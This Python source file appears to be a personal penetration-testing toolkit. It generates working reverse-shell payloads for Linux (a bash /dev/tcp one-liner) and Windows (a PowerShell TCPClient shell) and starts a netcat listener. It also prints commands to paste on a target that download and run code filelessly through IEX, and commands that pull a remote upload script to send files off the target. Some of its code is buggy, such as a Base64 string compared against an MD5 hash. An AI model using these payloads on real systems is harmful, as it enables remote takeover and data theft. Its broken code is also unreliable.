#!/usr/bin/env python

import os
import sys
import argparse
import subprocess
import random
import hashlib
import string
import netifaces as ni
import time
from getpass import getpass

# TRANSFERTO AVAILABLE METHODS (NEED TO ADD SMB AND FTP)
TransferTo_Methods = ['HTTP', 'SCP', 'Base64']

# TRANFERFROM AVAILABLE WINMETHODS (NEED TO ADD 'SMB', 'FTP', 'WebDAV')
TransferFrom_WinMethods = ['Base64', 'UploadServer']

# TRANFERFROM AVAILABLE NIXMETHODS (NEED TO ADD 'SMB', 'FTP', 'WebDAV')
TransferFrom_NixMethods = ['Base64']

# GENERATE CHOICES BASED ON A DYNAMIC LIST
def dynamic_populated_choices(entrymsg, dynamic_list):
    while True:
        print(entrymsg)
        i = 1
        temp_list = []
        for item in dynamic_list:
            print('      ' + str(i) + ') ' + item)
            i += 1
        print('[?] CHOICE: ', end='')
        try:
            choice = input()
        except KeyboardInterrupt:
            sys.exit(0)
        if int(choice) <= len(dynamic_list):
            choice = dynamic_list[int(choice)-1].lower()
            return choice
        else:
            print('[!] Invalid choice. Try again.')

# SELECT IP ADDRESS TO LISTEN TO
def listening_ip_address():
    # SELECT IP ADDRESS TO LISTEN TO
    ip_list = []
    for interface in ni.interfaces():
        ipv4 = ni.ifaddresses(interface)
        if ni.AF_INET in ipv4.keys():
            ip_list.append(ipv4[ni.AF_INET][0]['addr'])
    while True:
        print('[?] What IP address to listen on? ')
        i = 1
        for ip in ip_list:
            print('      ' + str(i) + ') ' + ip)
            i += 1
        print('[?] CHOICE: ', end='')
        try:
            choice = input()
            if choice == '':
                choice = '999'
        except KeyboardInterrupt:
            sys.exit(0)
        if int(choice) <= len(ip_list):
            return ip_list[int(choice)-1]
        else:
            print('Invalid choice. Try again.')

# RUN COMMONLY USED COMMANDS
def run_command(args):
    # RUN NMAP SCAN
    if args.command == 'nmap':
        print('[+] Running nmap scan on ' + args.target_ip)
        subprocess.run(['nmap', '-sV', '-Pn', '-p-', '-oA', args.target_ip, '--open', args.target_ip])
    # RUN GOBUSTER DIR
    elif args.command == 'gbdir':
        print('[+] Running gobuster dir on ' + args.target_url)
        subprocess.run(['gobuster', 'dir', '-u', args.target_url, '-w', '/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt', '>', args.target_url+'.gbdir'])
    # RUN GOBUSTER VHOST
    elif args.command == 'gbvhost':
        print('[+] Running gobuster vhost on ' + args.target_url)
        subprocess.run([['gobuster', 'vhost', '-u', args.target_url, '-w', '/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt', '>', args.target_url+'.gbvhost']])

# CREATE A PAYLOAD
def create_payload(args):
    if args.shell == 'bind':
        print('[?] Target IP: ', end='')
        listen_ip = input()
    else:
        listen_ip = listening_ip_address()
    print('[?] Listening Port [default=random]: ', end='')
    try:
        listen_port = input()
    except KeyboardInterrupt:
        sys.exit(0)
    if listen_port == '':
        listen_port = 'random'
    if listen_port == 'random':
        random_port = random.randint(1024, 49151)
        listen_port = str(random_port)
    print('[+] Using port ' + listen_port)
    print('[+] Creating payload ...')
    # CHECK PAYLOAD OS
    if args.shell == 'reverse':
        if args.os == 'linux':
            print('\n[===== LINUX PAYLOAD =====]\n')
            print('bash -c \'bash -i >& /dev/tcp/' + listen_ip + '/' + listen_port + ' 0>&1\'')
            print('\n[=== END LINUX PAYLOAD ===]\n')
        elif args.os == 'windows':
            print('\n[===== WINDOWS PAYLOAD =====]\n')
            print('powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient(\'' + listen_ip + '\',' + listen_port + ');$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + \'PS \' + (pwd).Path + \'> \';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()\"')
            print('\n[=== END WINDOWS PAYLOAD ===]\n')

        # PROMPT FOR LISTENER
        print('[?] Would you like to run a listener? [Y/n] ', end='')
        run_listener = input().lower()

        # START LISTENER
        if run_listener == '' or run_listener[0] == 'y':
            try:
                print('[+] Listening on ' + listen_ip + ':' + listen_port + ' ...')
                cmd = 'nc -nls ' + listen_ip + ' -p ' + listen_port
                subprocess.run(cmd)
            except KeyboardInterrupt:
                sys.exit(0)
        else:
            print('[-] No listener was started')
    elif args.shell == 'bind':
        print('[!] Not yet implemented')
    elif args.shell == 'web':
        print('[!] Not yet implemented')

# TRANSFER FILES TO
def transfer_to(args):
    # SEPARATE RELATIVE PATH TO FILE FROM FILENAME ITSELF
    relpath = args.filename
    args.filename = os.path.basename(os.path.normpath(args.filename))

    # GENERATE RANDOM FILENAME FOR EXTREMELY MINIMAL FILE OBFUSCATION
    rand_filename = ''.join(random.choices(string.ascii_letters, k=8))

    # SELECT METHOD
    entrymsg = '[?] What method to use?'
    method = dynamic_populated_choices(entrymsg, TransferTo_Methods)

    # PYTHON HTTP SERVER METHOD
    if method == 'http':
        listen_ip = listening_ip_address()

        # START PYTHON HTTP SERVER
        print('[+] Starting HTTP server on ' + listen_ip + ':443 ...')
        try:
            pyserver = subprocess.Popen(['python', '-m', 'http.server', '-b', listen_ip, '443'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print('[+] HTTP server succesfully started')
        except KeyboardInterrupt:
            pyserver.terminate()
            sys.exit(0)
        except:
            print('[!] Failed to start HTTP server')
            sys.exit(1)
        
        # TARGET PASTABLES
        if args.os == 'windows':
            print('[+] Select method:')
            print('      1. DownloadFile')
            print('      2. DownloadString - Fileless')
            print('      3. Invoke-WebRequest')
            print('      4. Invoke-WebRequest - Fileless')
            print('[?] CHOICE: ', end='')
            try:
                choice = input()
            except KeyboardInterrupt:
                pyserver.terminate()
                sys.exit(0)
            if choice == '':
                choice = '1'
                print('[+] DownloadFile method selected')
            if choice == '1':
                print('[+] DownloadFile method selected')
                print('[?] Sync or Async [default=sync]: ', end='')
                try:
                    sync = input().lower()
                except KeyboardInterrupt:
                    pyserver.terminate()
                    sys.exit(0)
                if sync == '':
                    sync = 'sync'
                if sync == 'async':
                    print('[+] Using Asynchronous DownloadFile')
                    startcmd = '(New-Object Net.WebClient).DownloadFileAsync(\'https://' + listen_ip + '/' + args.filename + '\',\'' + rand_filename + '\')'
                    endcmd = ''
                elif sync == 'sync':
                    print('[+] Using Synchronous DownloadFile')
                    startcmd = '(New-Object Net.WebClient).DownloadFile(\'https://' + listen_ip + '/' + args.filename + '\',\'' + rand_filename + '\')'
                    endcmd = ''
            elif choice == '2':
                print('[+] DownloadString - Fileless method selected')
                choice = random.randint(1, 2)
                if choice == '1':
                    startcmd = 'IEX (New-Object Net.WebClient).DownloadString(\'https://' + listen_ip + '/' + args.filename + '\')'
                    endcmd = ''
                else:
                    startcmd = '(New-Object Net.WebClient).DownloadString(\'https://' + listen_ip + '/' + args.filename
                    endcmd = '\') | IEX'
            elif choice == '3':
                print('[+] Invoke-WebRequest method selected')
                startcmd = 'Invoke-WebRequest https://' + listen_ip + '/' + args.filename
                endcmd = ' -OutFile ' + rand_filename
            elif choice == '4':
                print('[+] Invoke-WebRequest - Fileless method selected')
                startcmd = 'Invoke-WebRequest https://' + listen_ip + '/' + args.filename
                endcmd = ' | IEX'
            else:
                print('[!] Invalid choice')

            command = startcmd + endcmd

            # if args.firstlaunch:
            #     command = startcmd + ' -UseBasicParsing' + endcmd

            print('[+] Run this command on target')
            print('\n[===== START WINDOWS POWERSHELL COMMAND =====]\n')
            # if args.trust:
            #     print('[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}')
            print(command)
            print('\n[====== END WINDOWS POWERSHELL COMMAND ======]\n')
        elif args.os == 'linux':
            print('\n[===== START LINUX COMMAND =====]\n')
            print('wget https://' + listen_ip + '/' + args.filename)
            print('\nOR\n')
            print('curl https://' + listen_ip + '/' + args.filename + ' -o ' + '/tmp/' + rand_filename)
            print('\n[====== END LINUX COMMAND ======]\n')

        print('[?] Close HTTP server? [Y/n] ', end='')
        time.sleep(1)
        try:
            subterminate = input().lower()
        except KeyboardInterrupt:
            pyserver.terminate()
            sys.exit(0)
        if subterminate == '':
            subterminate = 'y'
        if subterminate == 'n':
            print('[!] HTTP server was left open')
        else:
            try:
                pyserver.terminate()
                print('[+] HTTP server succesfully terminated')
            except:
                print('[!] Could not terminate Python HTTP server')
        
    # BASE64 METHOD
    elif method == 'base64':
        print('[+] Generating Base64 string of file')
        b64_file = subprocess.run(['base64', '-w', '0', relpath], capture_output=True, text=True)
        md5h = hashlib.md5(open(relpath, 'rb').read()).hexdigest()
        print('[+] Run this command on target')

        # ON WINDOWS POWERSHELL LESS THAN 8191 CHARACTERS
        if args.os == 'windows':
            finalcmd = '[IO.File]::WriteAllBytes(\"' + '.\", [Convert]::FromBase64String(\"' + b64_file.stdout + '")); Get-FileHash ' + args.filename + ' -Algorithm md5'
            if len(finalcmd) <= 8191:
                print('\n[===== START WINDOWS POWERSHELL COMMAND =====]\n')
                print(finalcmd)
                print('\n[====== END WINDOWS POWERSHELL COMMAND ======]\n')
            else:
                print('[!] cmd.exe has a maximum string length of 8,191 characters.')
        # ON LINUX
        elif args.os == 'linux':
            print('\n[===== START LINUX COMMAND =====]\n')
            print('echo \'' + b64_file.stdout + '\' | base64 -d > ' + args.filename + ' && md5sum ' + args.filename)
            print('\n[====== END LINUX COMMAND ======]\n')


        # VERIFY MD5 HASH
        while(True):
            try:
                print('[?] Paste MD5 checksum output here to compare: ', end='')
                md5c = input()
                if md5c == md5h:
                    print('[+] MD5 checksum matches! You\'re good to go.')
                    break
                else:
                    print('[-] Uh-oh... MD5 checksum doesn\'t match. Try again.')
            except KeyboardInterrupt:
                sys.exit(0)

    # SCP METHOD
    elif method == 'scp':
        print('[?] Target IP: ', end='')
        target_ip = input()
        print('[?] Target port [default=22]: ', end='')
        target_port = input()
        if target_port == '':
            target_port = '22'
        print('[?] SCP Username: ', end='')
        scp_user = input()
        scp_password = getpass(prompt='[?] SCP Password: ')
        print('[+] Uploading ' + args.filename + ' to /tmp on ' + target_ip + ' ...')
        scp_connect = scp_user + '@' + target_ip + ':/tmp/' + rand_filename
        res = subprocess.run(['scp', '-P', target_port, args.filename, scp_connect], capture_output=True, text=True)
        if res.returncode == 0:
            print('[+] File uploaded as /tmp/' + rand_filename)
        elif res.returncode == 255:
            print('[!] File could not be uploaded. Connection refused.')

def get_absolute_path():
    print('[?] What is the absolute path of the file on target: ', end='')
    try:
        file_absolute_path = input()
        return file_absolute_path
    except KeyboardInterrupt:
        sys.exit(0)

# TRANSFER FILES FROM
def transfer_from(args):
    # SEPARATE RELATIVE PATH TO FILE FROM FILENAME ITSELF
    relpath = args.filename
    args.filename = os.path.basename(os.path.normpath(args.filename))

    # GENERATE RANDOM FILENAME FOR EXTREMELY MINIMAL FILE OBFUSCATION
    rand_filename = ''.join(random.choices(string.ascii_letters, k=8))

    entrymsg = '[?] What method to use?'

    ###########################
    ### FROM WINDOWS TARGET ###
    ###########################
    if args.os == 'windows':
        # METHOD SELECTION
        method = dynamic_populated_choices(entrymsg, TransferFrom_WinMethods)

        #############################
        ### WINDOWS BASE64 METHOD ###
        #############################
        if method == 'base64':
            file_absolute_path = get_absolute_path()
            filename = file_absolute_path.split('\\')[-1]
            while True:
                finalcmd = '[Convert]::ToBase64String((Get-Content -path \"' + file_absolute_path + '\" -Encoding byte))'
                finalcmd2 = 'Get-FileHash ' + file_absolute_path + ' -Algorithm md5'
                print('\n[================== RUN ON TARGET ==================]\n')
                print('# GENERATE BASE64 STRING')
                print(finalcmd)
                print('\n# GENERATE MD5 CHECKSUM')
                print(finalcmd2)
                print('\n[================ END RUN ON TARGET ================]\n')
                print('[?] Paste generated Base64 string here: ', end='')
                try:
                    b64 = input()
                except KeyboardInterrupt:
                    sys.exit(0)
                cmd = 'echo \'' + b64 + '\' | base64 -d > ' + filename
                create_file = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
                create_file.wait()
                md5h = hashlib.md5(open(filename, 'rb').read()).hexdigest()
                if b64 == md5h:
                    print('[+] File succesfully transferred to current directory')
                    break
                else:
                    cmd = 'rm ' + filename
                    subprocess.run(cmd, shell=True)
                    print('[!] MD5 checksum does not match')
                    try:
                        input('[*] Press any key to try again ...')
                    except KeyboardInterrupt:
                        sys.exit(0)

        ###################################
        ### WINDOWS UPLOADSERVER METHOD ###
        ###################################
        elif method == 'uploadserver':
            # START UPLOADSERVER
            listen_ip = listening_ip_address()
            print('[+] Starting upload server on ' + listen_ip + ':443 ...')
            try:
                uploadserver = subprocess.Popen(['python3', '-m', 'uploadserver', '-b', listen_ip, '443'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                print('[+] Upload server successfully started')
            except KeyboardInterrupt:
                sys.exit(0)
            except:
                print('[!] Failed to start upload server')
                sys.exit(1)

            # GET FILENAME AND ABSOLUTE PATH
            file_absolute_path = get_absolute_path()
            filename = file_absolute_path.split('\\')[-1]

            # TARGET PASTABLES
            finalcmd = 'IEX(New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1\')'
            finalcmd2 = 'Invoke-FileUpload -Uri https://' + listen_ip + '/upload -File ' + file_absolute_path
            print('\n[================== RUN ON TARGET ==================]\n')
            print('# DOWNLOAD PSUPLOAD.PS1')
            print(finalcmd)
            print('\n# UPLOAD ' + filename.upper() + ' TO UPLOAD SERVER')
            print(finalcmd2)
            print('\n[================ END RUN ON TARGET ================]\n')

            # TERMINATE UPLOAD SERVER WHEN DONE
            print('[?] Close upload server? [Y/n] ', end='')
            time.sleep(1)
            subterminate = input().lower()
            if subterminate == '':
                subterminate = 'y'
            if subterminate == 'n':
                print('[!] HTTP server was left open')
            else:
                try:
                    uploadserver.terminate()
                    print('[+] Upload server succesfully terminated')
                except:
                    print('[!] Could not terminate upload server')

    #########################
    ### FROM LINUX TARGET ###
    #########################
    elif args.os == 'linux':
        method = dynamic_populated_choices(entrymsg, TransferFrom_NixMethods)

        #     print('[-] Still working on it')
            # b64_file = subprocess.run(['base64', '-w', '0', relpath], capture_output=True, text=True)
            # print('\n[===== START LINUX COMMAND =====]\n')
            # print('echo \'' + b64_file.stdout + '\' | base64 -d > ' + args.filename + ' && md5sum ' + args.filename)
            # print('\n[====== END LINUX COMMAND ======]\n')

# CRACK PASSWORDS
def password_crack(args):
    print('[?] Which cracker would you like to use?')
    print('      1) Hashcat [Default]')
    print('      2) John The Ripper')
    print('CHOICE [1/2]: ', end='')
    crackprog = input().lower()

    if crackprog == '':
        crackprog = 1

    if crackprog == 2:
        print('[*] Not yet implemented')
    else:
        print('[*] Not yet implemented')

# CONNECT TO TARGET SMB
def smb_connect(args):
    print('[+] Connecting to ' + args.target_ip + ' ...')
    smb_connection = subprocess.Popen(['smbclient', '-U', args.username, '\\\\' + args.target_ip + '\\'])
    print(smb_connection)

def main():
    # ARGUMENT PARSER
    parser = argparse.ArgumentParser(
        description='Jay\'s Toolkit',
        epilog='Use \"jref [module] -h\" for more information about a module.'
    )

    # JTK MODULES
    modules = parser.add_subparsers(title='Available Modules', dest='module')

    ################################
    ### PASSWORD CRACKING MODULE ###
    ################################
    # crackpass = modules.add_parser('crackpass', help='Crack password hashes')
    # crackpass.add_argument('filename', help='File that contains password hashes to crack')

    ##########################
    ### SMB CONNECT MODULE ###
    ##########################
    # smb = modules.add_parser('smb', help='Connect to SMB server')
    # smb.add_argument('target_ip', help='SMB server IP address')
    # smb.add_argument('-u', dest='username', help='SMB username')

    #############################
    ### FILE TRANSFER MODULES ###
    #############################
    transferto = modules.add_parser('transferto', help='Semi-automated file transfer to target')
    transferto.add_argument('os', help='Operating system to transfer to', choices=['windows', 'linux'])
    transferto.add_argument('filename', help='File to transfer')
    transferfrom = modules.add_parser('transferfrom', help='Pastables to transfer from target')
    transferfrom.add_argument('os', help='Operating system to transfer to', choices=['windows', 'linux'])
    transferfrom.add_argument('filename', help='File to transfer')

    #############################################
    ### RUN MODULE FOR COMMONLY USED COMMANDS ###
    #############################################
    # run_parser = modules.add_parser('run', help='Commonly used commands')
    
    # # RUN COMMANDS
    # commands = run_parser.add_subparsers(
    #     title='Available Commands',
    #     dest='command'
    # )

    # # RUN NMAP
    # run_nmap = commands.add_parser(
    #     'nmap',
    #     help='$(nmap -sV -Pn -p- -oA <target_ip> --open <target_ip>)'
    # )
    # run_nmap.add_argument('target_ip')

    # # RUN GOBUSTER DIR
    # run_gbdir = commands.add_parser(
    #     'gbdir',
    #     help='$(gobuster dir -u <target_url> -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt > target_url.gbdir)'
    # )
    # run_gbdir.add_argument('target_url')

    # # RUN GOBUSTER VHOST
    # run_gbvhost = commands.add_parser(
    #     'gbvhost',
    #     help='$(gobuster vhost -u <target_url> -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt > target_url.gbvhost)'
    # )
    # run_gbvhost.add_argument('target_url')

    ##########################################
    ### PAYLOADS MODULE TO GENERATE SHELLS ###
    ##########################################
    payloads = modules.add_parser('payloads', help='Reverse Shell, Bind Shell, and Web Shell')
    payloads.add_argument('shell', choices=['reverse','bind','web'], help='Type of shell')
    payloads.add_argument('os', help='Target operating system', choices=['linux', 'windows'])
    # payloads.add_argument('--encode', choices=['base64','hex','nospace'])

    # PARSE ALL ARGS
    args = parser.parse_args() 
    # if args.module == 'run':
    #     run_command(args)
    if args.module == 'payloads':
        create_payload(args)
    elif args.module == 'transferto':
        transfer_to(args)
    elif args.module == 'transferfrom':
        transfer_from(args)
    # elif args.module == 'crackpass':
    #     password_crack(args)
    # elif args.module == 'smb':
    #     smb_connect(args)
    else:
        parser.print_help()

if __name__ == '__main__':
    main()